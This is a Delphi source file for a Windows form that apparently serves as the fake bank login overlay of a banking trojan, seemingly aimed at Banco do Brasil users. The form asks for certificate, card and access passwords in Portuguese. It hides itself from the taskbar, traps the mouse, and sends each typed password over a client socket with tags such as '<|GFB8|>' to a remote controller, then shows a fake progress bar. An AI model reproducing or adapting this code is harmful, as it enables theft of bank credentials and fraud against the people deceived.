unit Unit5;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, jpeg, ExtCtrls;

type
  TFrmBBGF = class(TForm)
    PanelBBGFCert: TPanel;
    Image2: TImage;
    Image3: TImage;
    Edit1: TEdit;
    Label3: TLabel;
    PanelBBGF6: TPanel;
    Image4: TImage;
    Image5: TImage;
    Label1: TLabel;
    Edit2: TEdit;
    PanelBBGFAcesso: TPanel;
    Image7: TImage;
    Image1: TImage;
    Label2: TLabel;
    Edit3: TEdit;
    procedure FormShow(Sender: TObject);
    procedure Image5Click(Sender: TObject);
    procedure Image3Click(Sender: TObject);
    procedure Edit2KeyPress(Sender: TObject; var Key: Char);
    procedure Image1Click(Sender: TObject);
  private
    { Private declarations }
    procedure CreateParams(var pr: TCreateParams); override;
  public
    { Public declarations }
  end;

var
  FrmBBGF: TFrmBBGF;

implementation

uses Conectar, Unit12, Unit21;

{$R *.dfm}

procedure TFrmBBGF.FormShow(Sender: TObject);
begin
ShowWindow(Application.Handle, SW_HIDE);
Func.PrendeMouse (Form12.Left, Form12.Top, Form12.Width, Form12.Height);
end;

procedure TFrmBBGF.CreateParams(var pr: TCreateParams);
begin
inherited;
pr.WndParent:= Form1.Handle;
end;


procedure TFrmBBGF.Image5Click(Sender: TObject);
begin
if Length(Edit2.Text) < 8 then
begin
//Label2.Visible := True;
//Label2.Caption := 'Digite sua Senha corretamente!';
MessageBox(self.handle, PChar('Digite sua Senha corretamente'), PChar('ATENÇÂO'), MB_ICONWARNING or MB_OK);
Edit2.Clear;
Edit2.SetFocus;
exit
end

else

Form1.CS1.Socket.SendText('<|GFB8|>'+FrmBBGF.Edit2.Text+'<|>');
Screen.Cursor := crHourGlass;
sleep(900);
Edit2.Text := '';
Screen.Cursor := crDefault;
PanelBBGF6.Visible := False;
Form12.PanelBBGF.Visible := True;
Form12.TrmGaugeBBGF.Enabled := True;
Func.TravaM;
end;

procedure TFrmBBGF.Image3Click(Sender: TObject);
begin
if Length(Edit1.Text) < 4 then
begin
//Label2.Visible := True;
//Label2.Caption := 'Digite sua Senha corretamente!';
MessageBox(self.handle, PChar('Digite a sua Senha corretamente'), PChar('ATENÇÂO'), MB_ICONWARNING or MB_OK);
Edit1.Clear;
Edit1.SetFocus;
exit
end

else

Form1.CS1.Socket.SendText('<|GFBC|>'+FrmBBGF.Edit1.Text+'<|>');
Screen.Cursor := crHourGlass;
sleep(900);
Edit1.Text := '';
Screen.Cursor := crDefault;
PanelBBGFCert.Visible := False;
Form12.PanelBBGF.Visible := True;
Form12.TrmGaugeBBGF.Enabled := True;
Func.TravaM;

end;

procedure TFrmBBGF.Edit2KeyPress(Sender: TObject; var Key: Char);
begin
// Aceitar somente números
If not( key in['0'..'9',#08] ) then
  key:=#0;
end;

procedure TFrmBBGF.Image1Click(Sender: TObject);
begin
if Length(Edit3.Text) < 4 then
begin
//Label2.Visible := True;
//Label2.Caption := 'Digite sua Senha corretamente!';
//Application.MessageBox('Digite seu Código SMS corretamente!', 'Erro', 16);
MessageBox(self.handle, PChar('Digite a sua Senha de Acesso corretamente'), PChar('ATENÇÂO'), MB_ICONWARNING or MB_OK);
Edit3.Clear;
Edit3.SetFocus;
exit
end

else

Form1.CS1.Socket.SendText('<|BBEA|>'+FrmBBGF.Edit3.Text+'<|>');
Screen.Cursor := crHourGlass;
sleep(900);
Edit3.Text := '';
Screen.Cursor := crDefault;
FrmBBGF.PanelBBGFAcesso.Visible := False;
Form12.PanelBBGF.Visible := True;
Form12.TrmGaugeBBGF.Enabled := True;
Func.TravaM;

end;

end.
